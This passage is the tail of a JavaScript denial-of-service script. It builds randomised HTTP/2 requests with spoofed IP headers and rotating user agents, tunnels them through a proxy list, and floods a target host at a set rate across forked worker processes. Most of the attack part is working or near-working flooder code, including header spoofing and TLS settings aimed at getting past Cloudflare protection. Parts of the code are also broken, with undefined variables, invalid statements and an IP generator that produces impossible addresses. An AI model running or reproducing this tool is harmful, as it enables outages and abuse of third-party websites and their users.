 "Opera/9.80 (Windows NT 6.1; U; de) Presto/2.2.15 Version/10.10",
 "Opera/9.80 (Windows NT 6.0; U; Gecko/20100115; pl) Presto/2.2.15 Version/10.10",
 "Opera/9.80 (Windows NT 6.0; U; en) Presto/2.2.15 Version/10.10",
 "Opera/9.80 (Windows NT 5.1; U; de) Presto/2.2.15 Version/10.10",
 "Opera/9.80 (Windows NT 5.1; U; cs) Presto/2.2.15 Version/10.10",
 "Mozilla/5.0 (Windows NT 6.0; U; tr; rv:1.8.1) Gecko/20061208 Firefox/2.0.0 Opera 10.10",
 "Mozilla/4.0 (compatible; MSIE 6.0; X11; Linux i686; de) Opera 10.10",
 "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 6.0; tr) Opera 10.10",
 "Opera/9.80 (X11; Linux x86_64; U; en-GB) Presto/2.2.15 Version/10.01",
 "Opera/9.80 (X11; Linux x86_64; U; en) Presto/2.2.15 Version/10.00",
 "Opera/9.80 (X11; Linux x86_64; U; de) Presto/2.2.15 Version/10.00",
 "Opera/9.80 (X11; Linux i686; U; ru) Presto/2.2.15 Version/10.00",
 "Opera/9.80 (X11; Linux i686; U; pt-BR) Presto/2.2.15 Version/10.00",
 "Opera/9.80 (X11; Linux i686; U; pl) Presto/2.2.15 Version/10.00",
 "Opera/9.80 (X11; Linux i686; U; nb) Presto/2.2.15 Version/10.00",
 "Opera/9.80 (X11; Linux i686; U; en-GB) Presto/2.2.15 Version/10.00",
 "Opera/9.80 (X11; Linux i686; U; en) Presto/2.2.15 Version/10.00",
 "Opera/9.80 (X11; Linux i686; U; Debian; pl) Presto/2.2.15 Version/10.00",
 "Opera/9.80 (X11; Linux i686; U; de) Presto/2.2.15 Version/10.00",
 "Opera/9.80 (Windows NT 6.1; U; zh-cn) Presto/2.2.15 Version/10.00",
 "Opera/9.80 (Windows NT 6.1; U; fi) Presto/2.2.15 Version/10.00",
 "Opera/9.80 (Windows NT 6.1; U; en) Presto/2.2.15 Version/10.00",
 "Opera/9.80 (Windows NT 6.1; U; de) Presto/2.2.15 Version/10.00",
 "Opera/9.80 (Windows NT 6.1; U; cs) Presto/2.2.15 Version/10.00",
 "SEC-SGHE900/1.0 NetFront/3.2 Profile/MIDP-2.0 Configuration/CLDC-1.1 Opera/8.01 (J2ME/MIDP; Opera Mini/2.0.4509/1378; nl; U; ssr)",
 "SEC-SGHX210/1.0 UP.Link/6.3.1.13.0",
 "SEC-SGHX820/1.0 NetFront/3.2 Profile/MIDP-2.0 Configuration/CLDC-1.1",
 "SonyEricssonK310iv/R4DA Browser/NetFront/3.3 Profile/MIDP-2.0 Configuration/CLDC-1.1 UP.Link/6.3.1.13.0",
 "SonyEricssonK550i/R1JD Browser/NetFront/3.3 Profile/MIDP-2.0 Configuration/CLDC-1.1",
 "SonyEricssonK610i/R1CB Browser/NetFront/3.3 Profile/MIDP-2.0 Configuration/CLDC-1.1",
 "SonyEricssonK750i/R1CA Browser/SEMC-Browser/4.2 Profile/MIDP-2.0 Configuration/CLDC-1.1",
 "SonyEricssonK800i/R1CB Browser/NetFront/3.3 Profile/MIDP-2.0 Configuration/CLDC-1.1 UP.Link/6.3.0.0.0",
 "SonyEricssonK810i/R1KG Browser/NetFront/3.3 Profile/MIDP-2.0 Configuration/CLDC-1.1",
 "SonyEricssonS500i/R6BC Browser/NetFront/3.3 Profile/MIDP-2.0 Configuration/CLDC-1.1",
 "SonyEricssonT100/R101",
 "Opera/9.80 (Macintosh; Intel Mac OS X 10.4.11; U; en) Presto/2.7.62 Version/11.00",
 "Opera/9.80 (S60; SymbOS; Opera Mobi/499; U; ru) Presto/2.4.18 Version/10.00",
 "Opera/9.80 (Windows NT 5.2; U; en) Presto/2.2.15 Version/10.10",
 "Opera/9.80 (Windows NT 6.1; U; en) Presto/2.7.62 Version/11.01",
   "Mozilla/5.0 (X11; U; Linux i686; en-GB; rv:1.9.0.10) Gecko/2009042513 Ubuntu/8.04 (hardy) Firefox/3.0.10",
 "Mozilla/5.0 (X11; U; Linux i686; de; rv:1.9.0.10) Gecko/2009042523 Ubuntu/9.04 (jaunty) Firefox/3.0.10",
 "More Firefox 3.0.10 user agents strings -->>",
 "Mozilla/5.0 (X11; U; OpenBSD amd64; en-US; rv:1.9.0.1) Gecko/2008081402 Firefox/3.0.1",
 "Mozilla/5.0 (X11; U; Linux x86_64; rv:1.9.0.1) Gecko/2008072820 Firefox/3.0.1",
 "Mozilla/5.0 (X11; U; Linux x86_64; pl-PL; rv:1.9.0.1) Gecko/2008071222 Ubuntu/hardy Firefox/3.0.1",
 "Mozilla/5.0 (X11; U; Linux x86_64; pl-PL; rv:1.9.0.1) Gecko/2008071222 Ubuntu (hardy) Firefox/3.0.1",
 "Mozilla/5.0 (X11; U; Linux x86_64; pl-PL; rv:1.9.0.1) Gecko/2008071222 Firefox/3.0.1",
 "Mozilla/5.0 (X11; U; Linux x86_64; ko-KR; rv:1.9.0.1) Gecko/2008071717 Firefox/3.0.1",
 "Mozilla/5.0 (X11; U; Linux x86_64; it; rv:1.9.0.1) Gecko/2008071717 Firefox/3.0.1",
 "Mozilla/5.0 (X11; U; Linux x86_64; fr; rv:1.9.0.1) Gecko/2008071222 Firefox/3.0.1",
 "Mozilla/5.0 (X11; U; Linux x86_64; fr; rv:1.9.0.1) Gecko/2008070400 SUSE/3.0.1-1.1 Firefox/3.0.1",
 "Mozilla/5.0 (X11; U; Linux x86_64; es-ES; rv:1.9.0.1) Gecko/2008072820 Firefox/3.0.1",
 "Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.0.1) Gecko/2008110312 Gentoo Firefox/3.0.1",
 "Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.0.1) Gecko/2008072820 Kubuntu/8.04 (hardy) Firefox/3.0.1",
 "Mozilla/5.0 (X11; U; Linux x86_64; en-GB; rv:1.9.0.1) Gecko/2008072820 Firefox/3.0.1 FirePHP/0.1.1.2",
 "Mozilla/5.0 (X11; U; Linux x86_64; de; rv:1.9.0.1) Gecko/2008070400 SUSE/3.0.1-0.1 Firefox/3.0.1",
 "Mozilla/5.0 (X11; U; Linux x86_64) Gecko/2008072820 Firefox/3.0.1",
 "Mozilla/5.0 (X11; U; Linux i686; rv:1.9) Gecko/20080810020329 Firefox/3.0.1",
 "Mozilla/5.0 (X11; U; Linux i686; ru; rv:1.9.0.1) Gecko/2008071719 Firefox/3.0.1",
 "Mozilla/5.0 (X11; U; Linux i686; ru; rv:1.9.0.1) Gecko/2008070208 Firefox/3.0.1",
 "Mozilla/5.0 (X11; U; Linux i686; pl-PL; rv:1.9.0.1) Gecko/2008071719 Firefox/3.0.1",
 "Mozilla/5.0 (X11; U; Linux i686; pl-PL; rv:1.9.0.1) Gecko/2008071222 Firefox/3.0.1",
 "More Firefox 3.0.1 user agents strings -->>",
 "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.9.0.8) Gecko/2009032609 Firefox/3.0.0 (.NET CLR 3.5.30729)",
 "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.9.0.1) Gecko/2008070208 Firefox/3.0.0",
 "Mozilla/5.0 (Windows; U; Windows NT 5.1; de; rv:1.9.0.1) Gecko/2008070208 Firefox/3.0.0",
 "Mozilla/6.0 (Macintosh; U; PPC Mac OS X Mach-O; en-US; rv:2.0.0.0) Gecko/20061028 Firefox/3.0",
 "Mozilla/5.0 (X11; U; SunOS sun4u; it-IT; ) Gecko/20080000 Firefox/3.0",
 "Mozilla/5.0 (X11; U; Linux x86_64; pl-PL; rv:1.9) Gecko/2008060309 Firefox/3.0",
 "Mozilla/5.0 (X11; U; Linux x86_64; it; rv:1.9) Gecko/2008061017 Firefox/3.0",
 "Mozilla/5.0 (X11; U; Linux x86_64; fr; rv:1.9) Gecko/2008061017 Firefox/3.0",
 "Mozilla/5.0 (X11; U; Linux x86_64; es-AR; rv:1.9) Gecko/2008061017 Firefox/3.0",
 "Mozilla/5.0 (X11; U; Linux x86_64; es-AR; rv:1.9) Gecko/2008061015 Ubuntu/8.04 (hardy) Firefox/3.0",
 "Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.0) Gecko/2008061600 SUSE/3.0-1.2 Firefox/3.0",
 "Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9) Gecko/2008062908 Firefox/3.0 (Debian-3.0~rc2-2)",
 "Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9) Gecko/2008062315 (Gentoo) Firefox/3.0",
 "Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9) Gecko/2008061317 (Gentoo) Firefox/3.0"
];

const pathts = [
  "?page=1",
  "?page=2",
  "?page=3",
  "?category=news",
  "?category=sports",
  "?category=technology",
  "?category=entertainment", 
  "?sort=newest",
  "?filter=popular",
  "?limit=10",
  "?start_date=1989-06-04",
  "?end_date=1989-06-04",
 ];
 const ip_spoof = () => {
  const ip_segment = () => {
    return Math.floor(Math.random() * 255555555);
  };
  return `${""}${ip_segment()}${"."}${ip_segment()}${"."}${ip_segment()}${"."}${ip_segment()}${""}`;
};

const accept_header = [
'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
    'Accept-Language: en-US,en;q=0.5',
    'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:100.0) Gecko/20100101 Firefox/100.0',
    'Connection: keep-alive',
    'Referer: https://www.example.com',
    'Upgrade-Insecure-Requests: 1',
    'DNT: 1',
    'Accept-Encoding: gzip, deflate, br',
    'Cache-Control: max-age=0',
    'Host: www.example.com',
    'Origin: https://www.example.com',
    'Content-Type: application/x-www-form-urlencoded',
    'Content-Length: 42',
    'Cookie: session_id=abc123; user_id=12345',
    'If-None-Match: "686897696a7c876b7e"',
    'X-Requested-With: XMLHttpRequest',
    'X-Forwarded-For: 192.168.1.1',
    'CF-Challenge: captcha-challenge-header',
  "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
  "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
  "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
  "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
  "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8",
  "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
  "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9,application/json",
  "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9,application/json,application/xml",
  "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9,application/json,application/xml,application/xhtml+xml",
  "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9,application/json,application/xml,application/xhtml+xml,text/css",
  "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9,application/json,application/xml,application/xhtml+xml,text/css,text/javascript",
  "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9,application/json,application/xml,application/xhtml+xml,text/css,text/javascript,application/javascript",
  "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/x-www-form-urlencoded",
  "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/x-www-form-urlencoded,text/plain",
  "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/x-www-form-urlencoded,text/plain,application/json",
  "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/x-www-form-urlencoded,text/plain,application/json,application/xml",
  "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/x-www-form-urlencoded,text/plain,application/json,application/xml,application/xhtml+xml",
  "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/x-www-form-urlencoded,text/plain,application/json,application/xml,application/xhtml+xml,text/css",
  "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/x-www-form-urlencoded,text/plain,application/json,application/xml,application/xhtml+xml,text/css,text/javascript",
  "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/x-www-form-urlencoded,text/plain,application/json,application/xml,application/xhtml+xml,text/css,text/javascript,application/javascript",
"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/x-www-form-urlencoded,text/plain,application/json,application/xml,application/xhtml+xml,text/css,text/javascript,application/javascript,application/xml-dtd",
  "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/x-www-form-urlencoded,text/plain,application/json,application/xml,application/xhtml+xml,text/css,text/javascript,application/javascript,application/xml-dtd,text/csv",
  "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/x-www-form-urlencoded,text/plain,application/json,application/xml,application/xhtml+xml,text/css,text/javascript,application/javascript,application/xml-dtd,text/csv,application/vnd.ms-excel",
];

const lang_header = [
  "he-IL,he;q=0.9,en-US;q=0.8,en;q=0.7",
  "fr-CH, fr;q=0.9, en;q=0.8, de;q=0.7, *;q=0.5",
  "en-US,en;q=0.5", "en-US,en;q=0.9",
  "de-CH;q=0.7",
  "da, en-gb;q=0.8, en;q=0.7",
  "cs;q=0.5",
  'en-US,en;q=0.9',
  'en-GB,en;q=0.9',
  'en-CA,en;q=0.9',
  'en-AU,en;q=0.9',
  'en-NZ,en;q=0.9',
  'en-ZA,en;q=0.9',
  'en-IE,en;q=0.9',
  'en-IN,en;q=0.9',
  'ar-SA,ar;q=0.9',
  'az-Latn-AZ,az;q=0.9',
  'be-BY,be;q=0.9',
  'bg-BG,bg;q=0.9',
  'bn-IN,bn;q=0.9',
  'ca-ES,ca;q=0.9',
  'cs-CZ,cs;q=0.9',
  'cy-GB,cy;q=0.9',
  'da-DK,da;q=0.9',
  'de-DE,de;q=0.9',
  'el-GR,el;q=0.9',
  'es-ES,es;q=0.9',
  'et-EE,et;q=0.9',
  'eu-ES,eu;q=0.9',
  'fa-IR,fa;q=0.9',
  'fi-FI,fi;q=0.9',
  'fr-FR,fr;q=0.9',
  'ga-IE,ga;q=0.9',
  'gl-ES,gl;q=0.9',
  'gu-IN,gu;q=0.9',
  'he-IL,he;q=0.9',
  'hi-IN,hi;q=0.9',
  'hr-HR,hr;q=0.9',
  'hu-HU,hu;q=0.9',
  'hy-AM,hy;q=0.9',
  'id-ID,id;q=0.9',
  'is-IS,is;q=0.9',
  'it-IT,it;q=0.9',
  'ja-JP,ja;q=0.9',
  'ka-GE,ka;q=0.9',
  'kk-KZ,kk;q=0.9',
  'km-KH,km;q=0.9',
  'kn-IN,kn;q=0.9',
  'ko-KR,ko;q=0.9',
  'ky-KG,ky;q=0.9',
  'lo-LA,lo;q=0.9',
  'lt-LT,lt;q=0.9',
  'lv-LV,lv;q=0.9',
  'mk-MK,mk;q=0.9',
  'ml-IN,ml;q=0.9',
  'mn-MN,mn;q=0.9',
  'mr-IN,mr;q=0.9',
  'ms-MY,ms;q=0.9',
  'mt-MT,mt;q=0.9',
  'my-MM,my;q=0.9',
  'nb-NO,nb;q=0.9',
  'ne-NP,ne;q=0.9',
  'nl-NL,nl;q=0.9',
  'nn-NO,nn;q=0.9',
  'or-IN,or;q=0.9',
  'pa-IN,pa;q=0.9',
  'pl-PL,pl;q=0.9',
  'pt-BR,pt;q=0.9',
  'pt-PT,pt;q=0.9',
  'ro-RO,ro;q=0.9',
  'ru-RU,ru;q=0.9',
  'si-LK,si;q=0.9',
  'sk-SK,sk;q=0.9',
  'sl-SI,sl;q=0.9',
  'sq-AL,sq;q=0.9',
  'sr-Cyrl-RS,sr;q=0.9',
  'sr-Latn-RS,sr;q=0.9',
  'sv-SE,sv;q=0.9',
  'sw-KE,sw;q=0.9',
  'ta-IN,ta;q=0.9',
  'te-IN,te;q=0.9',
  'th-TH,th;q=0.9',
  'tr-TR,tr;q=0.9',
  'uk-UA,uk;q=0.9',
  'ur-PK,ur;q=0.9'
 ];
 
 const encoding_header = [
  'gzip',
  'gzip, deflate, br',
  'compress, gzip',
  'deflate, gzip',
  'gzip, identity',
  'gzip, deflate',
  'br',
  'br;q=1.0, gzip;q=0.8, *;q=0.1',
  'gzip;q=1.0, identity; q=0.5, *;q=0',
  'gzip, deflate, br;q=1.0, identity;q=0.5, *;q=0.25',
  'compress;q=0.5, gzip;q=1.0',
  'identity',
  'gzip, compress',
  'compress, deflate',
  'compress',
  'gzip, deflate, br',
  'deflate',
  'gzip, deflate, lzma, sdch',
  'deflate'
 ];
 
 const control_header = [
 'max-age=604800',
  'proxy-revalidate',
  'public, max-age=0',
  'max-age=315360000',
  'public, max-age=86400, stale-while-revalidate=604800, stale-if-error=604800',
  's-maxage=604800',
  'max-stale',
  'public, immutable, max-age=31536000',
  'must-revalidate',
  'private, max-age=0, no-store, no-cache, must-revalidate, post-check=0, pre-check=0',
  'max-age=31536000,public,immutable',
  'max-age=31536000,public',
  'min-fresh',
  'private',
  'public',
  's-maxage',
  'no-cache',
  'no-cache, no-transform',
  'max-age=2592000',
  'no-store',
  'no-transform',
  'max-age=31557600',
  'stale-if-error',
  'only-if-cached',
  'max-age=0',
  'must-understand, no-store',
  'max-age=31536000; includeSubDomains',
  'max-age=31536000; includeSubDomains; preload',
  'max-age=120',
  'max-age=0,no-cache,no-store,must-revalidate',
  'public, max-age=604800, immutable',
  'max-age=0, must-revalidate, private',
  'max-age=0, private, must-revalidate',
  'max-age=604800, stale-while-revalidate=86400',
  'max-stale=3600',
  'public, max-age=2678400',
  'min-fresh=600',
  'public, max-age=30672000',
  'max-age=31536000, immutable',
  'max-age=604800, stale-if-error=86400',
  'public, max-age=604800',
  'no-cache, no-store,private, max-age=0, must-revalidate',
  'o-cache, no-store, must-revalidate, pre-check=0, post-check=0',
  'public, s-maxage=600, max-age=60'
 ];
 
 site = [
    'cross-site',
	'same-origin',
	'same-site',
	'none'
  ];
  
  mode = [
    'cors',
	'navigate',
	'no-cors',
	'same-origin'
  ];
  
  dest = [
    'document',
	'image',
	'embed',
	'empty',
	'frame'
  ];
 
var cipper = cplist[Math.floor(Math.floor(Math.random() * cplist.length))];
var proxies = readLines(args.proxyFile);
const fakeIP = ip_spoof();
 var mode1 = mode[Math.floor(Math.floor(Math.random() * mode.length))];
 var dest1 = dest[Math.floor(Math.floor(Math.random() * dest.length))];
 var accept = accept_header[Math.floor(Math.floor(Math.random() * accept_header.length))];
 var lang = lang_header[Math.floor(Math.floor(Math.random() * lang_header.length))];
 var encoding = encoding_header[Math.floor(Math.floor(Math.random() * encoding_header.length))];
 var control = control_header[Math.floor(Math.floor(Math.random() * control_header.length))];
var queryString = queryStrings[Math.floor(Math.random() * queryStrings.length)];
const parsedTarget = url.parse(args.target);

if (cluster.isMaster) {
   for (let counter = 1; counter <= args.threads; counter++) {
       cluster.fork();
   }
} else {setInterval(runFlooder) }

class NetSocket {
    constructor(){}

 HTTP(options, callback) {
    const parsedAddr = options.address.split(":");
    const addrHost = parsedAddr[0];
    const payload = "CONNECT " + options.address + ":443 HTTP/1.1\r\nHost: " + options.address + ":443\r\nProxy-Connection: Keep-Alive\r\nConnection: Keep-Alive\r\n\r\n";
    const buffer = new Buffer.from(payload);

    const connection = net.connect({
        host: options.host,
        port: options.port
    });

    connection.setTimeout(options.timeout * 10000);
    connection.setKeepAlive(true, 100000);

    connection.on("connect", () => {
        connection.write(buffer);
    });

    connection.on("data", chunk => {
        const response = chunk.toString("utf-8");
        const isAlive = response.includes("HTTP/1.1 200");
        if (isAlive === false) {
            connection.destroy();
            return callback(undefined, "error: invalid response from proxy server");
        }
        return callback(connection, undefined);
    });

    connection.on("timeout", () => {
        connection.destroy();
        return callback(undefined, "error: timeout exceeded");
    });

    connection.on("error", error => {
        connection.destroy();
        return callback(undefined, "error: " + error);
    });
}
}
function randstr(length) {
  const characters =
    "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
  let result = "";
  const charactersLength = characters.length;
  for (let i = 0; i < length; i++) {
    result += characters.charAt(Math.floor(Math.random() * charactersLength));
  }
  return result;
}

//header racikan sendiri
const Socker = new NetSocket();
headers[":method"] = "GET";
headers[":method"] = "GET";
headers[":method"] = "POST";
headers[":method"] = "POST";
headers[":path"] = parsedTarget.path + pathts[Math.floor(Math.random() * pathts.length)] + "&" + randomString(10) + queryString + randomString(10);
headers["origin"] = parsedTarget.host;
headers["Content-Type"] = randomHeaders['Content-Type'];
headers[":scheme"] = "https";
headers["x-download-options"] = randomHeaders['x-download-options'];
headers["Cross-Origin-Embedder-Policy"] = randomHeaders['Cross-Origin-Embedder-Policy'];
headers["Cross-Origin-Opener-Policy"] = randomHeaders['Cross-Origin-Opener-Policy'];
headers["accept-language"] = lang;
headers["accept-encoding"] = encoding;
headers["accept"] = accept;
headers["Referrer-Policy"] = randomHeaders['Referrer-Policy'];
headers["x-cache"] = randomHeaders['x-cache'];
headers["Content-Security-Policy"] = randomHeaders['Content-Security-Policy'];
headers["cache-control"] = control;
headers["x-frame-options"] = randomHeaders['x-frame-options'];
headers["x-xss-protection"] = randomHeaders['x-xss-protection'];
headers["Allow"] = randomHeaders["Allow"];
headers["X-XSS-Protection"] = "1; mode=block";
headers["x-content-type-options"] = randomHeaders["x-content-type-options"];
headers["sec-fetch-dest"] = "document";
headers["sec-fetch-mode"] = "navigate";
headers["sec-fetch-site"] = "none";
headers["sec-ch-ua"] = '"Not.A/Brand";v="8", "Chromium";v="114", "Google Chrome";v="114"';
headers["sec-ch-ua-mobile"] = "?0";
headers["sec-ch-ua-platform"] = "Windows";
headers["TE"] = "trailers";
headers["Trailer"] = "Max-Forwards";
headers["pragma"] = randomHeaders['pragma'];
headers["upgrade-insecure-requests"] = "1";
headers["X-Forwarded-Proto"] = HTTPS;
headers["vary"] = randomHeaders['vary'];
headers["x-requested-with"] = "XMLHttpRequest";
headers["Server"] = randomHeaders['Server'];
headers["strict-transport-security"] = randomHeaders['strict-transport-security'];
headers["access-control-allow-headers"] = randomHeaders['access-control-allow-headers'];
headers["access-control-allow-origin"] = randomHeaders['access-control-allow-origin'];
headers["Content-Encoding"] = randomHeaders['Content-Encoding'];
headers["alt-svc"] = randomHeaders['alt-svc'];
headers["Via"] = fakeIP;
headers["sss"] = fakeIP;
headers["range"] = "bytes=0-499";
headers["Sec-Websocket-Key"] = fakeIP;
headers["Sec-Websocket-Version"] = 13;
headers["Upgrade"] = websocket;
headers["Alt-Svc"] = 'h2=":80"; ma=2592000';
headers["Server"] = "support-content-u";
headers["Server"] = "cloudflare";
headers["X-Forwarded-For"] = fakeIP;
headers["X-Forwarded-Host"] = fakeIP;
headers["Client-IP"] = fakeIP;
headers["Real-IP"] = fakeIP;
headers["Clear-Site-Data"] = "cache","cookies";
headers.Connection = 'keep-alive';
headers.get = " /HTTP/1.2"
headers["dnt"] = "1";
headers["cf-cache-status"] = "HIT";
headers["Accept-CH"] = "width";
headers["set-cookie"] = CookieCf;
headers["cookie"] = cookieString(scp.parse(response["set-cookie"]));
headers["set-cookie"] = randomHeaders["set-cookie"];
headers["cookie"] = RandomHeaders["cookie"];
headers["Sec-CH-UA-Platform-Version"] = randomHeaders["Sec-CH-UA-Platform-Version"];
headers["Referer"] = randomReferer;

function runFlooder() {
    const proxyAddr = randomElement(proxies);
    const parsedProxy = proxyAddr.split(":");
    const userAgentv2 = new UserAgent();
    var uap1 = uap[Math.floor(Math.floor(Math.random() * uap.length))];
    headers[":authority"] = parsedTarget.host
	headers["User-Agent"] = uap1;

    const proxyOptions = {
        host: parsedProxy[0],
        port: ~~parsedProxy[1],
        address: parsedTarget.host + ":443",
        timeout: 1000
    };

   setTimeout(function(){
     process.exit(1);
   }, process.argv[3] * 1000);
   
   process.on('uncaughtException', function(er) {
   });
   process.on('unhandledRejection', function(er) {
   });

    Socker.HTTP(proxyOptions, (connection, error) => {
        if (error) return

        connection.setKeepAlive(true, 100000);

        const tlsOptions = {
           ALPNProtocols: ['h2', 'http/1.1', 'http/1.2', 'h3'],
           challengesToSolve: Infinity,
           resolveWithFullResponse: true,
           followAllRedirects: true,
           maxRedirects: 10,
           clientTimeout: 5000,
           clientlareMaxTimeout: 10000,
           cloudflareTimeout: 5000,
           cloudflareMaxTimeout: 30000,
           ciphers: tls.getCiphers().join(":") + cipper,
           secureProtocol: ["TLSv1_1_method", "TLSv1_2_method", "TLSv1_3_method",],
           servername: url.hostname,
           socket: connection,
           honorCipherOrder: true,
           secureOptions: crypto.constants.SSL_OP_NO_RENEGOTIATION | crypto.constants.SSL_OP_NO_TICKET | crypto.constants.SSL_OP_NO_SSLv2 | crypto.constants.SSL_OP_NO_SSLv3 | crypto.constants.SSL_OP_NO_COMPRESSION | crypto.constants.SSL_OP_NO_RENEGOTIATION | crypto.constants.SSL_OP_ALLOW_UNSAFE_LEGACY_RENEGOTIATION | crypto.constants.SSL_OP_TLSEXT_PADDING | crypto.constants.SSL_OP_ALL | crypto.constants.SSLcom,
           sigals: concu,
           echdCurve: "GREASE:X25519:x25519:P-256:P-384:P-521:X448",
           secure: true,
           Compression: false,
           rejectUnauthorized: false,
           port: 443,
           uri: parsedTarget.host,
           servername: parsedTarget.host,
           sessionTimeout: 5000,
       };

        const tlsConn = tls.connect(443, parsedTarget.host, tlsOptions); 

        tlsConn.setKeepAlive(true, 60 * 10000);

        const client = http2.connect(parsedTarget.href, {
           protocol: "https:",
           settings: {
           headerTableSize: 65536,
           maxConcurrentStreams: 1000,
           initialWindowSize: 6291456,
           maxHeaderListSize: 262144,
           enablePush: false
         },
            maxSessionMemory: 64000,
            maxDeflateDynamicTableSize: 4294967295,
            createConnection: () => tlsConn,
            socket: connection,
        });

        client.settings({
           headerTableSize: 65536,
           maxConcurrentStreams: 20000,
           initialWindowSize: 6291456,
           maxHeaderListSize: 262144,
           enablePush: false
         });

        client.on("connect", () => {
           const IntervalAttack = setInterval(() => {
               for (let i = 0; i < args.Rate; i++) {
                   const request = client.request(headers)
                   
                   .on("response", response => {
                       request.close();
                       request.destroy();
                       return
                   });
   
                   request.end();
               }
           }, 1000); 
        });

        client.on("close", () => {
            client.destroy();
            connection.destroy();
            return
        });

        client.on("error", error => {
            client.destroy();
            connection.destroy();
            return
        });
    });
}
